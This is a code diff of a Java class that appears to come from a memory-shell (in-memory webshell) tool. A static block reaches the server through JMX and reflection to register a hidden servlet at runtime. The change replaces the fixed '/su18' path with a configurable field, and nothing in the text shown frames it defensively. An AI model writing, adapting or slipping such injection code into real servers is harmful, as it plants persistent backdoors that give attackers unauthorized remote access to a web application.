@@ -17,10 +17,11 @@ import java.util.*;
  */
 public class JSMSFromJMX implements Servlet {
 
+	public static String pattern;
+
 	static {
 		try {
 			String servletName = "su18" + System.nanoTime();
-			String urlPattern  = "/su18";
 
 			JmxMBeanServer mBeanServer = (JmxMBeanServer) ManagementFactory.getPlatformMBeanServer();
 
@@ -101,7 +102,7 @@ public class JSMSFromJMX implements Servlet {
 						}
 
 						servletMapping.getClass().getMethod("setServletName", String.class).invoke(servletMapping, servletName);
-						servletMapping.getClass().getMethod("setPathSpecs", String[].class).invoke(servletMapping, new Object[]{new String[]{urlPattern}});
+						servletMapping.getClass().getMethod("setPathSpecs", String[].class).invoke(servletMapping, new Object[]{new String[]{pattern}});
 						handler.getClass().getMethod("addServletMapping", clazz).invoke(handler, servletMapping);
 					}
 				} catch (Exception e) {
